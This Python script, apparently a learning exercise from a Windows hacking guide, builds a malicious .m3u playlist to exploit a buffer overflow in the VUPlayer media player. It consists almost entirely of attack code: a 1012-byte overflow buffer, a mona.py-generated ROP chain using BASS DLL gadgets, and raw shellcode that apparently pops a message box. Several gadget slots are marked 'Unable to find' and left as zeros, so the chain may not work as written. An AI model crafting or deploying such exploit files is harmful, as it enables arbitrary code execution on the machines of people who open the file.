#!/usr/bin/env python
#-*- coding: utf-8 -*-
'''
    python ==> 윈도우해킹가이드, vuplayer를 ROP를 사용해 exploit해 본 코드 
'''

import struct

p = open("test.m3u", "w")

SHELLCODE  = (
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x69\x21"
"\x21\x01\x68\x6e\x6d\x69\x6e\x68\x20\x68\x79\x75\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7"
)

BUFFER = "A" * 1012

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00000000,  # [-] Unable to find API pointer -> esi
      0x10102eae,  # MOV EAX,DWORD PTR DS:[ESI] # POP EBX # POP EDI # POP ESI # POP EBP # RETN 0x18 [BASSWMA.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x10605ce4,  # POP EBP # RETN [BASSMIDI.dll] 
      0x1002a659,  # & jmp esp [BASS.dll]
      0x10104922,  # POP EAX # RETN 0x0C [BASSWMA.dll] 
      0xc4ffffb6,  # put delta into eax (-> put 0x00000001 into ebx)
      0x10601f06,  # ADD EAX,3B00004B # RETN [BASSMIDI.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
      0x10101007,  # POP ECX # RETN [BASSWMA.dll] 
      0xffffffff,  #  
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x10603659,  # RETN (ROP NOP) [BASSMIDI.dll]
      0x10607f6f,  # POP EAX # RETN 0x0C [BASSMIDI.dll] 
      0x90909090,  # nop
      0x00000000,  # [-] Unable to find pushad gadget
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
    ]
    return ''.join(struct.pack('<L', _) for _ in rop_gadgets)


rop_chain = create_rop_chain()
  
payload = BUFFER + rop_chain + SHELLCODE

print "payload len is : ", len(payload)

p.write(payload)
p.close()
